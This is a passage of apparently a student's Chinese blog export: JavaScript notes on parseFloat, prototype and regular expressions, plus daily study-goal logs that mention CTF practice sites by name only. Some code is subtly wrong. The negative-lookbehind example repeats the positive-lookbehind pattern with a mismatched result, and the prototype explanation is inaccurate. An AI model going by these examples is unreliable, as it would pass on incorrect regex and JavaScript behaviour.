<p><em>其实就是要有一段字符串然后以数字开头，然后开始检索，遇到第一个不是数字的（空格也算）就把后头（包括这个）全砍掉。</em></p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseFloat(string)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(parseFloat(&quot;10&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;10.00&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;10.33&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;34 45 66&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;   60   &quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;40 years&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(parseFloat(&quot;He was 40&quot;) + &quot;&lt;br&gt;&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">10</span><br><span class="line">10.33</span><br><span class="line">34</span><br><span class="line">60</span><br><span class="line">40</span><br><span class="line">NaN</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-05日目标</title>
    <url>/2020/01/05/2020-01-05%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-05日目标"><a href="#2020-01-05日目标" class="headerlink" title="2020-01-05日目标"></a>2020-01-05日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>继续学习完善正则表达式</li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>花一点时间备考大英1</li>
</ol>
<h2 id="2020-01-04总结"><a href="#2020-01-04总结" class="headerlink" title="2020-01-04总结"></a>2020-01-04总结</h2><ol>
<li><a href="https://blog.csdn.net/h610443955/article/details/81079439" target="_blank" rel="noopener">发现了一篇有关正则表达式不错的文章</a>并学习整理了第一章节</li>
<li>在阿里云买了域名并绑定了博客，以后可以直接访问 <a href="www.albatross-g.site">我的新域名</a></li>
<li>复习了高数的渐近线和间断点</li>
<li>Js正则表达式-JS使用误区</li>
<li>完成了bugku前三道简单题（和南邮前三题几乎一样）</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>完善今日对 JS正则表达式 的整理</td>
<td>8</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>6</td>
</tr>
<tr>
<td>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></td>
<td>0</td>
</tr>
<tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>9:00去图书馆</td>
<td>9</td>
</tr>
<tr>
<td>状态</td>
<td>6</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS prototype属性</title>
    <url>/2020/01/04/JS-prototype%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>prototype 属性允许您向对象添加属性和方法</p>
<p><strong>*注意：</strong> Prototype 是全局属性，适用于所有的 Javascript 对象。*</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.prototype.name&#x3D;value;</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function employee(name,jobtitle,born)&#123;</span><br><span class="line">	this.name&#x3D;name;</span><br><span class="line">	this.jobtitle&#x3D;jobtitle;</span><br><span class="line">	this.born&#x3D;born;</span><br><span class="line">&#125;</span><br><span class="line">var fred&#x3D;new employee(&quot;Fred Flintstone&quot;,&quot;Caveman&quot;,1970);</span><br><span class="line">employee.prototype.salary&#x3D;null;</span><br><span class="line">fred.salary&#x3D;20000;</span><br><span class="line">document.write(fred.salary);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，prototype函数将salary属性的值清空，便于接下来的赋值。</p>
]]></content>
      <categories>
        <category>JS 属性整理</category>
      </categories>
      <tags>
        <tag>属性</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-04日目标</title>
    <url>/2020/01/04/2020-01-04%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-04日目标"><a href="#2020-01-04日目标" class="headerlink" title="2020-01-04日目标"></a>2020-01-04日目标</h2><ol>
<li>完善今日对 JS正则表达式 的整理</li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li>听力10min+单词10个</li>
<li>9:00去图书馆</li>
</ol>
<h2 id="2020-01-03总结"><a href="#2020-01-03总结" class="headerlink" title="2020-01-03总结"></a>2020-01-03总结</h2><ol>
<li>初步入门了 CSS盒子模型</li>
<li>完成了南邮ctf “这题不是web”和“层层递进”   （两题纯脑洞基本不含技术）</li>
<li>共整理了JS 五个函数</li>
<li>对JS 正则表达式有了初步了解</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>10min英语听力+10个英语单词</td>
<td>0</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-typeof.html" target="_blank" rel="noopener">JS typeof操作符</a>-JS代码规范</td>
<td>5</td>
</tr>
<tr>
<td><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮ctf “这题不是web”</a></td>
<td>10</td>
</tr>
<tr>
<td>CSS盒子模型</td>
<td>9</td>
</tr>
<tr>
<td>9:30在1307考html</td>
<td>7</td>
</tr>
<tr>
<td>状态</td>
<td>5</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS 正则表达式（持续更新）</title>
    <url>/2020/01/04/JS-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>正则表达式是由一个字符序列形成的搜索模式。</p>
<p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。</p>
<p>正则表达式可以是一个简单的字符，或一个更复杂的模式。</p>
<p>正则表达式可用于所有文本搜索和文本替换的操作。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;正则表达式主体&#x2F;修饰符(可选)</span><br></pre></td></tr></table></figure>

<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td>g</td>
<td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td>m</td>
<td>执行多行匹配</td>
</tr>
</tbody></table>
<h2 id="正则表达式模式"><a href="#正则表达式模式" class="headerlink" title="正则表达式模式"></a>正则表达式模式</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。</p>
<h3 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h3><h4 id="两种模糊匹配"><a href="#两种模糊匹配" class="headerlink" title="两种模糊匹配"></a>两种模糊匹配</h4><h5 id="m-n-横向模糊匹配"><a href="#m-n-横向模糊匹配" class="headerlink" title="{m,n}横向模糊匹配"></a>{m,n}横向模糊匹配</h5><p>横向模糊指的是，一个正则可匹配的字符串的长度不是固定的，可以是多种情况的。</p>
<blockquote>
<p>譬如<code>{m,n}</code>，表示连续出现最少m次，最多n次。</p>
</blockquote>
<h5 id="abc-纵向模糊匹配"><a href="#abc-纵向模糊匹配" class="headerlink" title="[abc]纵向模糊匹配"></a>[abc]纵向模糊匹配</h5><p>纵向模糊指的是，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符，可以有多种可能。</p>
<blockquote>
<p>譬如<code>[abc]</code>，表示该字符是可以字符“a”、“b”、“c”中的任何一个。</p>
</blockquote>
<p><em>需要强调的是，虽叫字符组（字符类），但只是其中一个字符。例如<code>[abc]</code>，表示匹配一个字符，它可以是“a”、“b”、“c”之一。</em></p>
<h4 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h4><h5 id="a-z-范围表示"><a href="#a-z-范围表示" class="headerlink" title="[a-z]范围表示"></a>[a-z]范围表示</h5><p>比如<code>[123456abcdefGHIJKLM]</code>，可以写成<code>[1-6a-fG-M]</code>。用连字符<code>-</code>来省略和简写。</p>
<blockquote>
<p>Q:那么要匹配“a”、“-”、“z”这三者中任意一个字符，该怎么做呢？</p>
<p>A:可以写成如下的方式：<code>[-az]</code>或<code>[az-]</code>或<code>[a\-z]</code>。即要么放在开头，要么放在结尾，要么转义。</p>
</blockquote>
<h5 id="abc-排除字符组"><a href="#abc-排除字符组" class="headerlink" title="[^abc]排除字符组"></a>[^abc]排除字符组</h5><p>排除字符组（反义字符组）就是，某位字符可以是任何东西，但就不能是”a”、”b”、”c”。</p>
<h5 id="d类似的简写形式"><a href="#d类似的简写形式" class="headerlink" title="\d类似的简写形式"></a>\d类似的简写形式</h5><blockquote>
<p><strong><code>\d</code></strong>就是<code>[0-9]</code>。表示是一位数字。记忆方式：其英文是digit（数字）。</p>
<p><strong><code>\D</code></strong>就是<code>[^0-9]</code>。表示除数字外的任意字符。</p>
<p><strong><code>\w</code></strong>就是<code>[0-9a-zA-Z_]</code>。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。</p>
<p><strong><code>\W</code></strong>是<code>[^0-9a-zA-Z_]</code>。非单词字符。</p>
<p><strong><code>\s</code></strong>是<code>[ \t\v\n\r\f]</code>。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。</p>
<p><strong><code>\S</code></strong>是<code>[^ \t\v\n\r\f]</code>。 非空白符。</p>
<p><strong><code>.</code></strong>就是<code>[^\n\r\u2028\u2029]</code>。通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。记忆方式：想想省略号…中的每个点，都可以理解成占位符，表示任何类似的东西。</p>
</blockquote>
<blockquote>
<p>Q:如果要匹配任意字符怎么办？</p>
<p>A:可以使用<code>[\d\D]</code>、<code>[\w\W]</code>、<code>[\s\S]</code>和<code>[^]</code>中任何的一个。</p>
</blockquote>
<h4 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h4><h5 id="m-类似的简写形式"><a href="#m-类似的简写形式" class="headerlink" title="{m,}类似的简写形式"></a>{m,}类似的简写形式</h5><blockquote>
<p><code>{m,}</code> 表示至少出现m次。</p>
<p><code>{m}</code> 等价于<code>{m,m}</code>，表示出现m次。</p>
<p>? 等价于{0,1}，表示出现或者不出现。记忆方式：问号的意思表示，有吗？</p>
<p><code>+</code>等价于<code>{1,}</code>，表示出现至少一次。记忆方式：加号是追加的意思，得先有一个，然后才考虑追加。</p>
<p><code>*</code> 等价于<code>{0,}</code>，表示出现任意次，有可能不出现。记忆方式：看看天上的星星，可能一颗没有，可能零散有几颗，可能数也数不过来。</p>
</blockquote>
<h5 id="贪婪匹配和惰性匹配"><a href="#贪婪匹配和惰性匹配" class="headerlink" title="贪婪匹配和惰性匹配"></a>贪婪匹配和惰性匹配</h5><h6 id="d-m-n-贪婪匹配"><a href="#d-m-n-贪婪匹配" class="headerlink" title="/\d{m,n}/贪婪匹配"></a>/\d{m,n}/贪婪匹配</h6><p>其中正则<code>/\d{2,5}/</code>，表示数字连续出现2到5次。会匹配2位、3位、4位、5位连续数字。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;\d&#123;2,5&#125;&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;123&quot;, &quot;1234&quot;, &quot;12345&quot;, &quot;12345&quot;]</span><br></pre></td></tr></table></figure>



<h6 id="d-m-n-惰性匹配"><a href="#d-m-n-惰性匹配" class="headerlink" title="/\d{m,n}?/惰性匹配"></a>/\d{m,n}?/惰性匹配</h6><p>其中<code>/\d{2,5}?/</code>表示，虽然2到5次都行，当2个就够的时候，就不在往下尝试了。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;\d&#123;2,5&#125;?&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;12&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;56&quot;]</span><br></pre></td></tr></table></figure>

<p>通过在量词后面加个问号就能实现惰性匹配，因此所有惰性匹配情形如下：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;m,n&#125;?</span><br><span class="line">&#123;m,&#125;?</span><br><span class="line">??</span><br><span class="line">+?</span><br><span class="line">*?</span><br></pre></td></tr></table></figure>
</blockquote>
<p><em>惰性匹配指的是在现有情况下去匹配最优（少）解，比如”??”代表1or0，如果匹配不到1则匹配0.</em></p>
<h4 id="a-b-多选分支"><a href="#a-b-多选分支" class="headerlink" title="/a|b/多选分支"></a>/a|b/多选分支</h4><p>具体形式如下：<code>(p1|p2|p3)</code>，其中<code>p1</code>、<code>p2</code>和<code>p3</code>是子模式，用<code>|</code>（管道符）分隔，表示其中任何之一。</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;good|nice&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;good idea, nice try.&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;good&quot;, &quot;nice&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Q:/a|b/和/[ab]/有什么区别呢？</p>
<p>A: emmm不太好讲，大家自己先体会下，等我变牛了来告诉你们！</p>
</blockquote>
<p>注：但有个事实我们应该注意，比如我用<code>/good|goodbye/</code>，去匹配”goodbye”字符串时，结果是”good”：*</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regex &#x3D; &#x2F;good|goodbye&#x2F;g;</span><br><span class="line">var string &#x3D; &quot;goodbye&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; [&quot;good&quot;]</span><br></pre></td></tr></table></figure>

<p><em>也就是说，分支结构也是惰性的，即当前面的匹配上了，后面的就不再尝试了（前提是两者要有重复部分）。</em></p>
<h4 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h4><h5 id="匹配16进制颜色值"><a href="#匹配16进制颜色值" class="headerlink" title="匹配16进制颜色值"></a><strong>匹配16进制颜色值</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>#ffbbad</p>
<p>#Fc01DF</p>
<p>#FFF</p>
<p>#ffE</p>
</blockquote>
<p>A:</p>
<blockquote>
<p>/#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})/g</p>
</blockquote>
<h5 id="匹配时间"><a href="#匹配时间" class="headerlink" title="匹配时间"></a><strong>匹配时间</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>23:59</p>
<p>02:07</p>
</blockquote>
<p>A:</p>
<blockquote>
<p><code>/([01][0-9]|[2][0-3]):([0-5][0-9])/</code></p>
</blockquote>
<h5 id="window操作系统文件路径"><a href="#window操作系统文件路径" class="headerlink" title="window操作系统文件路径"></a><strong>window操作系统文件路径</strong></h5><p>Q:要求匹配</p>
<blockquote>
<p>F:\study\javascript\regex\regular expression.pdf</p>
<p>F:\study\javascript\regex\</p>
<p>F:\study\javascript</p>
<p>F:\</p>
</blockquote>
<p>A:</p>
<blockquote>
<p><code>/^[a-zA-Z]:\\([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*([^\\:*&lt;&gt;|&quot;?\r\n/]+)?$/</code></p>
</blockquote>
<h3 id="位置匹配"><a href="#位置匹配" class="headerlink" title="位置匹配"></a>位置匹配</h3><h4 id="6个锚字符"><a href="#6个锚字符" class="headerlink" title="6个锚字符"></a>6个锚字符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ </span><br><span class="line">$ </span><br><span class="line">\b </span><br><span class="line">\B </span><br><span class="line">(?&#x3D;p) </span><br><span class="line">(?!p)</span><br></pre></td></tr></table></figure>



<h5 id="和"><a href="#和" class="headerlink" title="^和$"></a>^和$</h5><p><code>^</code>（脱字符）匹配开头，在多行匹配中匹配行开头。</p>
<p><code>$</code>（美元符号）匹配结尾，在多行匹配中匹配行结尾。</p>
<p><em>多行匹配模式时，二者是<strong>行</strong>的概念，这个需要我们的注意：</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;I\nlove\njavascript&quot;.replace(&#x2F;^|$&#x2F;gm, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">#I#</span><br><span class="line"></span><br><span class="line">#love#</span><br><span class="line"></span><br><span class="line">#javascript#</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="b和-B"><a href="#b和-B" class="headerlink" title="\b和\B"></a><strong>\b和\B</strong></h5><p><code>\b</code>是单词边界，具体就是<code>\w</code>和<code>\W</code>之间的位置，也包括<code>\w</code>和<code>^</code>之间的位置，也包括<code>\w</code>和<code>$</code>之间的位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;[JS] Lesson_01.mp4&quot;.replace(&#x2F;\b&#x2F;g, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;[#JS#] #Lesson_01#.#mp4#&quot;</span><br></pre></td></tr></table></figure>

<p><code>\B</code>就是<code>\b</code>的反面的意思，非单词边界。例如在字符串中所有位置中，扣掉<code>\b</code>，剩下的都是<code>\B</code>的。</p>
<p>具体说来就是<code>\w</code>与<code>\w</code>、<code>\W</code>与<code>\W</code>、<code>^</code>与<code>\W</code>，<code>\W</code>与<code>$</code>之间的位置。</p>
<p>比如上面的例子，把所有<code>\B</code>替换成”#”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;[JS] Lesson_01.mp4&quot;.replace(&#x2F;\B&#x2F;g, &#39;#&#39;);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;#[J#S]# L#e#s#s#o#n#_#0#1.m#p#4&quot;</span><br></pre></td></tr></table></figure>



<h5 id="p-和-p"><a href="#p-和-p" class="headerlink" title="(?=p)和(?!p)"></a><strong>(?=p)和(?!p)</strong></h5><p><code>(?=p)</code>，其中 <code>p</code> 是一个子模式，即 <code>p</code> 前面的位置，或者说，该位置后面的字符要匹配 <code>p</code>。比如<code>(?=l)</code>，表示 <code>l</code> 字符前面的位置，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; #lemon</span><br></pre></td></tr></table></figure>

<p>而 <code>(?!p)</code> 就是<code>(?=p)</code> 的反面意思，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?!l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; l#e#m#o#n#</span><br></pre></td></tr></table></figure>

<p>二者的学名分别是positive lookahead 和 negative lookahead。中文意思分别为正向先行断言和负向先行断言。ES5之后的版本，会支持positive lookbehind 和 negative lookbehind。意思是正向后行断言和负向后行断言。具体是<code>(?&lt;=p)</code> 和 (?&lt;!p)。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&lt;&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; l#emon</span><br></pre></td></tr></table></figure>

<p>表示该位置之前的字符要匹配 <code>l</code> 表达式。而 (?&lt;!p) 为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let result &#x3D; &#39;lemon&#39;.replace(&#x2F;(?&lt;&#x3D;l)&#x2F;g, &#39;#&#39;);</span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; #le#m#o#n#</span><br></pre></td></tr></table></figure>

<p>表示该位置之前的字符不能匹配 <code>l</code>。</p>
<h4 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h4><h5 id="不匹配任何东西的正则"><a href="#不匹配任何东西的正则" class="headerlink" title="不匹配任何东西的正则"></a><strong>不匹配任何东西的正则</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;.^&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="数字的千位分隔符表示法"><a href="#数字的千位分隔符表示法" class="headerlink" title="数字的千位分隔符表示法"></a><strong>数字的千位分隔符表示法</strong></h5><h6 id="弄出最后一个逗号"><a href="#弄出最后一个逗号" class="headerlink" title="弄出最后一个逗号"></a><strong>弄出最后一个逗号</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;12345678&quot;.replace(&#x2F;(?&#x3D;\d&#123;3&#125;$)&#x2F;g, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12345,678&quot;</span><br></pre></td></tr></table></figure>

<h6 id="弄出所有的逗号"><a href="#弄出所有的逗号" class="headerlink" title="弄出所有的逗号"></a><strong>弄出所有的逗号</strong></h6><p>因为逗号出现的位置，要求后面3个数字一组，也就是<code>\d{3}</code>至少出现一次。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; &quot;12345678&quot;.replace(&#x2F;(?&#x3D;(\d&#123;3&#125;)+$)&#x2F;g, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678&quot;</span><br></pre></td></tr></table></figure>

<h6 id="匹配其余案例"><a href="#匹配其余案例" class="headerlink" title="匹配其余案例"></a><strong>匹配其余案例</strong></h6><p>我们要求匹配的到这个位置不能是开头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var string1 &#x3D; &quot;12345678&quot;,</span><br><span class="line"></span><br><span class="line">string2 &#x3D; &quot;123456789&quot;;</span><br><span class="line"></span><br><span class="line">reg &#x3D; &#x2F;(?!^)(?&#x3D;(\d&#123;3&#125;)+$)&#x2F;g;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">var result &#x3D; string1.replace(reg, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678&quot;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?!^)代表我们将匹配的字符串其后面一位不能是^,即开头</em></strong></p>
<h5 id="支持其他形式"><a href="#支持其他形式" class="headerlink" title="支持其他形式"></a><strong>支持其他形式</strong></h5><p>如果要把”12345678 123456789”替换成”12,345,678 123,456,789”。</p>
<p>此时我们需要修改正则，把里面的开头<code>^</code>和结尾<code>$</code>，替换成<code>\b</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var string &#x3D; &quot;12345678 123456789&quot;,</span><br><span class="line"></span><br><span class="line">reg &#x3D; &#x2F;(?!\b)(?&#x3D;(\d&#123;3&#125;)+\b)&#x2F;g;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">var result &#x3D; string.replace(reg, &#39;,&#39;)</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;12,345,678 123,456,789&quot;</span><br></pre></td></tr></table></figure>

<p>其中<code>(?!\b)</code>怎么理解呢？</p>
<p>要求当前是一个位置，但不是<code>\b</code>前面的位置，其实<code>(?!\b)</code>说的就是<code>\B</code>。</p>
<p>因此最终正则变成了：<code>/\B(?=(\d{3})+\b)/g</code>。</p>
<h4 id="验证密码问题"><a href="#验证密码问题" class="headerlink" title="验证密码问题"></a><strong>验证密码问题</strong></h4><p>密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p>
<h5 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h5><p>不考虑“但必须至少包括2种字符”这一条件。我们可以容易写出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<h5 id="判断是否包含有某一种字符"><a href="#判断是否包含有某一种字符" class="headerlink" title="判断是否包含有某一种字符"></a><strong>判断是否包含有某一种字符</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?&#x3D;.*[0-9])^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?=.[0-9])代表我们将匹配的字符串其后应该是：任意个任意字符后加一个数字，即存在数字。</em></strong></p>
<h5 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;((?&#x3D;.*[0-9])(?&#x3D;.*[a-z])|(?&#x3D;.*[0-9])(?&#x3D;.*[A-Z])|(?&#x3D;.*[a-z])(?&#x3D;.*[A-Z]))^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>



<h5 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h5><p>“至少包含两种字符”的意思就是说，不能全部都是数字，也不能全部都是小写字母，也不能全部都是大写字母。</p>
<p>那么要求“不能全部都是数字”，怎么做呢？<code>(?!p)</code>出马！</p>
<p>对应的正则是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?!^[0-9]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>

<p><strong><em>(?!^[0-9]{6,12}$)代表我们将匹配的字符串，该位置后不能满足^[0-9]{6,12}$，即全是数字。</em></strong></p>
<h6 id="另一种解法的最终答案"><a href="#另一种解法的最终答案" class="headerlink" title="另一种解法的最终答案"></a>另一种解法的最终答案</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var reg &#x3D; &#x2F;(?!^[0-9]&#123;6,12&#125;$)(?!^[a-z]&#123;6,12&#125;$)(?!^[A-Z]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$&#x2F;;</span><br></pre></td></tr></table></figure>









<h3 id="非捕获性分组"><a href="#非捕获性分组" class="headerlink" title="非捕获性分组"></a>非捕获性分组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;先看用捕获性分组匹配会返回什么</span><br><span class="line">var str1 &#x3D; &#39;000aaa111&#39;;             </span><br><span class="line">var pattern &#x3D; &#x2F;([a-z]+)(\d+)&#x2F;; &#x2F;&#x2F;捕获性分组匹配</span><br><span class="line">var arr &#x3D; pattern.exec(str1);  </span><br><span class="line">console.log(arr) &#x2F;&#x2F;[&#39;aaa111&#39;,&#39;aaa&#39;,&#39;111&#39;]   结果子串也获取到了，这并不是我们想要的结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;非捕获性分组</span><br><span class="line">var str2 &#x3D; &#39;000aaa111&#39;;</span><br><span class="line">var pattern2 &#x3D; 